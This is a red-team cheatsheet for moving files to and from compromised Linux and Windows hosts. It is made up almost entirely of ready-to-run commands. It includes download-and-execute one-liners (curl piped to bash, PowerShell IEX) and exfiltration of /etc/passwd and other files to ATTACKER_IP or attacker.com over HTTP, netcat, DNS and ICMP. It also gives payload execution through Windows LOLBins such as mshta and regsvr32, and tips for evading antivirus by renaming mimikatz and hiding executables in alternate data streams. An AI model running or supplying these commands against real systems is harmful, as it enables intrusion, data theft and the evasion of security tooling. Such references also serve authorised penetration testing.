# File Transfer Cheatsheet

## Setting Up Servers (Attacker)

### Python HTTP Server

```bash
# Python 3
python3 -m http.server 80
python3 -m http.server 8080

# Python 2
python -m SimpleHTTPServer 80
```

### PHP Server

```bash
php -S 0.0.0.0:80
```

### Ruby Server

```bash
ruby -run -e httpd . -p 80
```

### SMB Server (Impacket)

```bash
# Basic
impacket-smbserver share $(pwd)

# With SMB2 support
impacket-smbserver share $(pwd) -smb2support

# With authentication
impacket-smbserver share $(pwd) -smb2support -user test -password test
```

### FTP Server

```bash
# Python pyftpdlib
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -w

# Twisted
pip install twisted
python3 -c "from twisted.protocols.ftp import FTPFactory, FTPRealm; from twisted.cred.portal import Portal; from twisted.cred.checkers import AllowAnonymousAccess; from twisted.internet import reactor; p = Portal(FTPRealm('./'), [AllowAnonymousAccess()]); f = FTPFactory(p); reactor.listenTCP(21, f); reactor.run()"
```

### Netcat Listener

```bash
# Receive file
nc -lvnp 4444 > received_file

# Send file
nc -lvnp 4444 < file_to_send
```

### TFTP Server

```bash
# Install
apt install atftpd

# Start
atftpd --daemon --port 69 /tftp
```

---

## Linux Download Methods

### Wget

```bash
wget http://ATTACKER_IP/file -O /tmp/file
wget http://ATTACKER_IP/file
```

### Curl

```bash
curl http://ATTACKER_IP/file -o /tmp/file
curl http://ATTACKER_IP/file > /tmp/file

# Execute directly
curl http://ATTACKER_IP/script.sh | bash
```

### Netcat

```bash
# On attacker (send)
nc -lvnp 4444 < file_to_send

# On victim (receive)
nc ATTACKER_IP 4444 > received_file

# Alternative (reversed)
# On victim (listen)
nc -lvnp 4444 > received_file

# On attacker (send)
nc VICTIM_IP 4444 < file_to_send
```

### /dev/tcp (Bash)

```bash
# Download
cat < /dev/tcp/ATTACKER_IP/PORT > file

# Upload
cat file > /dev/tcp/ATTACKER_IP/PORT
```

### SCP

```bash
# Download from attacker
scp user@ATTACKER_IP:/path/to/file /local/path

# Upload to attacker
scp /local/file user@ATTACKER_IP:/remote/path
```

### SFTP

```bash
sftp user@ATTACKER_IP
get file
put file
```

### Base64 Encoding

```bash
# On attacker - encode
base64 -w 0 file > file.b64
cat file.b64  # Copy output

# On victim - decode
echo "BASE64_STRING" | base64 -d > file
```

### PHP

```bash
php -r '$file = file_get_contents("http://ATTACKER_IP/file"); file_put_contents("/tmp/file", $file);'
```

### Python

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP/file', '/tmp/file')"
python2 -c "import urllib; urllib.urlretrieve('http://ATTACKER_IP/file', '/tmp/file')"
```

### Perl

```bash
perl -e 'use LWP::Simple; getstore("http://ATTACKER_IP/file", "/tmp/file");'
```

### Ruby

```bash
ruby -e 'require "net/http"; File.write("/tmp/file", Net::HTTP.get(URI.parse("http://ATTACKER_IP/file")))'
```

---

## Linux Upload Methods

### Curl

```bash
# POST upload
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# PUT upload
curl -T /etc/passwd http://ATTACKER_IP/passwd
```

### Netcat

```bash
# On attacker (receive)
nc -lvnp 4444 > received_file

# On victim (send)
nc ATTACKER_IP 4444 < /etc/passwd
```

### Base64

```bash
# On victim
base64 /etc/passwd

# Copy output, decode on attacker
echo "BASE64_STRING" | base64 -d > passwd
```

---

## Windows Download Methods

### Certutil

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe
```

### PowerShell

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri http://ATTACKER_IP/file.exe -OutFile C:\temp\file.exe
iwr http://ATTACKER_IP/file.exe -OutFile file.exe

# WebClient
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe', 'C:\temp\file.exe')

# Faster with progress disabled
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile file.exe

# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
IEX(iwr http://ATTACKER_IP/script.ps1 -UseBasicParsing)

# Base64 encoded command
powershell -enc BASE64_ENCODED_COMMAND
```

### Bitsadmin

```cmd
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\temp\file.exe
```

### SMB

```cmd
# Copy from SMB share (no auth)
copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
xcopy \\ATTACKER_IP\share\file.exe C:\temp\

# Run directly from share
\\ATTACKER_IP\share\file.exe

# Mount share
net use Z: \\ATTACKER_IP\share
copy Z:\file.exe C:\temp\
```

### FTP (Non-Interactive)

```cmd
# Create FTP commands file
echo open ATTACKER_IP > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -s:ftp.txt
```

### TFTP

```cmd
tftp -i ATTACKER_IP get file.exe
```

### VBScript

```vbscript
' download.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://ATTACKER_IP/file.exe", False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "C:\temp\file.exe", 2
end with
```

```cmd
cscript download.vbs
```

### JScript (Windows Script Host)

```javascript
// download.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", "http://ATTACKER_IP/file.exe", false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("C:\\temp\\file.exe");
```

```cmd
cscript download.js
```

---

## Windows Upload Methods

### PowerShell

```powershell
# Upload via POST
$body = Get-Content C:\path\to\file -Raw
Invoke-WebRequest -Uri http://ATTACKER_IP/upload -Method POST -Body $body

# Invoke-RestMethod
Invoke-RestMethod -Uri http://ATTACKER_IP/upload -Method Post -InFile C:\path\to\file
```

### SMB

```cmd
copy C:\path\to\file \\ATTACKER_IP\share\file
```

### Base64

```powershell
# Encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file"))

# Copy output, decode on attacker
echo "BASE64_STRING" | base64 -d > file
```

### Netcat

```cmd
# On attacker (receive)
nc -lvnp 4444 > received_file

# On victim (send) - requires nc.exe
nc.exe ATTACKER_IP 4444 < C:\path\to\file
```

---

## Exfiltration Methods

### DNS Exfiltration

```bash
# Split data into DNS queries
# On attacker - set up DNS server or use collaborator

# On victim - send data via nslookup
for /f "tokens=*" %a in ('type secret.txt') do nslookup %a.attacker.com
```

### ICMP Exfiltration

```bash
# On attacker
tcpdump -i tun0 icmp

# On victim
xxd -p -c 16 /etc/passwd | while read line; do ping -c 1 -p $line ATTACKER_IP; done
```

### HTTP GET Parameters

```bash
# On attacker - capture with nc or web server
nc -lvnp 80

# On victim
curl "http://ATTACKER_IP/?data=$(cat /etc/passwd | base64 -w 0)"
```

---

## Living Off the Land

### Windows LOLBins for Download

| Binary | Command |
|--------|---------|
| certutil | `certutil -urlcache -split -f http://IP/file file` |
| bitsadmin | `bitsadmin /transfer job /download /priority high http://IP/file C:\file` |
| powershell | `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file','C:\file')"` |
| curl (Win10+) | `curl http://IP/file -o file` |
| expand | `expand \\IP\share\file.cab C:\file` |
| esentutl | `esentutl /y \\IP\share\file /d C:\file /o` |
| findstr | `findstr /V dummystring \\IP\share\file > C:\file` |
| hh.exe | `hh.exe http://IP/file.chm` |
| ieexec | `ieexec.exe http://IP/file.exe` |
| makecab | (compression only) |
| mshta | `mshta http://IP/file.hta` |
| regsvr32 | `regsvr32 /u /s /i:http://IP/file.sct scrobj.dll` |
| rundll32 | `rundll32 javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://IP/file.sct");window.close();` |

### Linux LOLBins for Download

| Binary | Command |
|--------|---------|
| wget | `wget http://IP/file` |
| curl | `curl http://IP/file -o file` |
| fetch | `fetch http://IP/file` |
| lwp-download | `lwp-download http://IP/file` |
| python | `python -c "import urllib; urllib.urlretrieve('http://IP/file', 'file')"` |
| ruby | `ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("http://IP/file")))'` |
| php | `php -r '$f=file_get_contents("http://IP/file");file_put_contents("file",$f);'` |
| perl | `perl -e 'use LWP::Simple; getstore("http://IP/file", "file");'` |

---

## Tips

### Bypassing AV/EDR

```powershell
# Rename suspicious files
copy mimikatz.exe mimi.txt

# Use alternate data streams
type file.exe > innocent.txt:file.exe
wmic process call create "C:\path\innocent.txt:file.exe"
```

### Checking File Integrity

```bash
# MD5
md5sum file
certutil -hashfile file MD5

# SHA256
sha256sum file
certutil -hashfile file SHA256
```



